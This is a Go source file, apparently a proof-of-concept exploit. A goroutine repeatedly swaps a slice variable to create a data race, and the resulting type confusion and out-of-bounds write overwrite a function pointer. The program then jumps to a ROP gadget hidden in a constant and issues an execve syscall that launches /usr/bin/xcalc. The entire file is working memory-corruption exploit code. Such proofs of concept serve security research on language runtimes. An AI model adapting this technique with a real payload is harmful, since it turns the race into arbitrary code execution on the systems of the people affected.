package main

import "fmt"

var win = false
var i = 0

type fptr struct {
	f func(w uint64, x uint64, y uint64, z uint64)
}

func addrof(i interface{}) uint64 {
	s := fmt.Sprintf("%p", i)[2:]
	addr := uint64(0)
	for i := 0; i < len(s); i++ {
		addr *= 0x10
		c := uint8(s[i:i+1][0])
		if 0x30 <= c && c <= 0x39 {
			addr += uint64(c - uint8('0'))
		} else {
			addr += uint64(c - uint8('a') + 0xa)
		}
	}
	return addr
}

func rop_gadget() {
	var s uint64
	s = 0x050f5a5e5f5859 /* pop rcx, rax, rdi, rsi, rdx; ret; */
	fmt.Printf("%v\n", s)
}

func main() {
	/* prepare arguments */
	args := make([]uint64, 8)
	args[0] = 0x6e69622f7273752f /* /usr/bin/xcalc */
	args[1] = 0x0000636c6163782f
	args[2] = 0x3d59414c50534944 /* DISPLAY=:0 */
	args[3] = 0x000000000000303a
	args[4] = addrof(&args[0])
	args[5] = 0
	args[6] = addrof(&args[2])
	args[7] = 0
	fmt.Printf("filename: %x\n", addrof(&args[0]))
	fmt.Printf("argv: %x\n", addrof(&args[4]))
	fmt.Printf("envp: %x\n", addrof(&args[6]))

	/* shellcode */
	pp := addrof(rop_gadget) + 0x23
	fmt.Printf("ROP gadget: 0x%x\n", pp)
	fmt.Scanf("%d")
	
	/* data race */
	a := make([]*uint64, 2)
	b := make([]*uint64, 1)
	target := new(fptr)
	fmt.Printf("%v, %v, %v\n", a, b, target)
	
	confused := b
	go func() {
		for {
			confused = a
			func() {
				if i >= 0 {
					return
				}
				fmt.Println(confused)
			}()
			confused = b
			i++
		}
	}()
	for {
		func() {
			defer func() { recover() }()
			confused[1] = &pp
		}()
		if target.f != nil {
			target.f(59, addrof(&args[0]), addrof(&args[4]), addrof(&args[6]))
		}
	}
}
